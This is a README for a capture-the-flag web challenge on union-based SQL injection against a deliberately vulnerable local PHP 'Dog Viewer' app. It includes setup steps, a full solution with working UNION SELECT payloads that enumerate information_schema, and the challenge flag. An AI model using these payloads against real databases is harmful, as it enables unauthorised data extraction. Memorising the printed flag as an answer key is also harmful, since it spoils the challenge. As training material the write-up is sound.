# Inj3ction Time - SQL Injection CTF Challenge

A web exploitation challenge focusing on **Union-Based SQL Injection**.

## Challenge Description

Welcome to the Dog Viewer! This simple website displays information about dogs based on an ID parameter in the URL. Your goal is to manipulate the database query to extract a hidden flag from a secret table.

## Setup

### Using Docker (Recommended)

1. Start the containers:

```bash
docker-compose up -d
```

2. Access the challenge:

```
http://localhost:8080
```

### Manual Setup

1. Import the database schema:

```bash
mysql -u root -p < database/schema.sql
```

2. Configure your web server (Apache/Nginx) to serve the `public/` directory
3. Update database credentials in `public/index.php` if needed

## Challenge Solution

### Step 1: Find the Column Count

Use ORDER BY to determine the number of columns:

```
?id=1 ORDER BY 4  # Success
?id=1 ORDER BY 5  # Failure
```

The query has **4 columns**.

### Step 2: Locate the Injection Point

Use UNION SELECT with an invalid ID:

```
?id=-1 UNION SELECT 1, 2, 3, 4
```

Numbers appear in Name, Breed, Color, and Owner. Any of the four positions are reflected; we’ll use position 2 for data extraction.

### Step 3: Find the Secret Table

Query information_schema:

```
?id=-1 UNION SELECT 1, group_concat(table_name), 3, 4 FROM information_schema.tables WHERE table_schema=database()
```

You'll find tables including `w0w_y0u_f0und_m3`.

### Step 4: Find the Secret Column

Enumerate columns for the secret table:

```
?id=-1 UNION SELECT 1, group_concat(column_name), 3, 4 FROM information_schema.columns WHERE table_schema=database() AND table_name='w0w_y0u_f0und_m3'
```

You should see a column named `f0und_m3`.

### Step 5: Extract the Flag

Select from the secret table:

```
?id=-1 UNION SELECT 1, f0und_m3, 3, 4 FROM w0w_y0u_f0und_m3
```

**Flag:** `abctf{uni0n_1s_4_gr34t_c0mm4nd}`

## Files

- `public/index.php` - Vulnerable web application
- `database/schema.sql` - Database setup with sample data and hidden flag
- `docker-compose.yml` - Docker configuration for easy setup

## Cleanup

Stop and remove containers:

```bash
docker-compose down
```

Remove volumes (including database data):

```bash
docker-compose down -v
```
